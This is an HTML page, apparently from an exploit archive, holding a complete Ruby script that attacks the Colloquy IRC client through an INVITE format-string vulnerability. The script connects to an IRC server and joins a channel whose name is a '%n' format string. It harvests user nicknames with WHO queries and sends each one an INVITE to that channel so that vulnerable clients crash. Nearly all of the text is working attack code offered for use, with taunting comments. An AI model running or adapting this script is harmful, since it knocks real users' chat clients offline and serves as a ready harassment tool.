<html><head><title>Colloquy <= 2.1.3545 (INVITE) Format String Denial of Service Exploit</title></head><pre>#!/usr/bin/ruby
# (c) Copyright 2006 Lance M. Havok &lt;lmh@info-pull.com&gt;
#
# Makes use of the Colloquy INVITE format string vulnerability.
#

require 'socket'

target_channel  = (ARGV[0] || &quot;#whatever&quot;)
target_server   = (ARGV[1] || &quot;irc.server.org&quot;)
target_port     = (ARGV[2] || 6667)

rand_nick       = &quot;spongebo&quot;
channel_joined  = false
ready_to_go     = false
abuse_attempts  = 2
chan_fmtstring  = (&quot;#%n%n%n%n&quot;) # develop payload when feeling like it.
target_furries = []

irc_socket = TCPSocket.new(target_server, target_port.to_i)

irc_socket.print &quot;USER #{rand_nick} localhost localhost r\n&quot;
irc_socket.print &quot;NICK #{rand_nick}\r\n&quot;
while true
  s = irc_socket.gets
  case s.strip
    when /^PING :(.+)$/i
      puts &quot;++ PING...&quot;
      irc_socket.send &quot;PONG :#{$1}\n&quot;, 0
      puts &quot;++ PONG.&quot;
    when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]PING (.+)[\001]$/i
      puts &quot;++ CTCP PING from #{$1}!#{$2}@#{$3}&quot;
      irc_socket.send &quot;NOTICE #{$1} :\001PING #{$4}\001\n&quot;, 0
    when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]VERSION[\001]$/i
      puts &quot;++ CTCP VERSION from #{$1}!#{$2}@#{$3}&quot;
      irc_socket.send &quot;NOTICE #{$1} :\001VERSION Unabomber v0.011\001\n&quot;, 0
    when /n=(.+) (.+) (.+) (.+) (.+) (.*)$/i
      nickarr = s.scan(/n=(.+) (.+) (.+) (.+) (.+) (.*)/).flatten

      if nickarr.size &gt; 3
        if nickarr[2].size &gt; 2 and nickarr[2] != target_server
          nickarr = nickarr[2]
        elsif nickarr[1].size &gt; 2 and nickarr[1] != target_server
          nickarr = nickarr[1]
        elsif nickarr[3].size &gt; 2 and nickarr[3] != target_server
          nickarr = nickarr[3]
        end
        
        target_furries &lt;&lt; nickarr
      end
    else
      unless channel_joined
        #irc_socket.send &quot;JOIN #{target_channel}\n&quot;, 0 (uncomment to join channel)
        irc_socket.send &quot;JOIN #{chan_fmtstring}\n&quot;, 0
        channel_joined = true
      end
      
      if channel_joined and abuse_attempts != 0
        irc_socket.send &quot;WHO #{target_channel}\n&quot;, 0
        abuse_attempts -= 1
      end

      # we need to throttle the pwnage or server will kick our ass
      if target_furries.size &gt; 1
        target_furries.each do |zealot|
          puts &quot;++ Pwning #{zealot}&quot;
          irc_socket.send &quot;INVITE #{zealot} #{chan_fmtstring}\n&quot;, 0
          sleep 1
        end
      end
  end
end

# milw0rm.com [2007-01-17]</pre></html>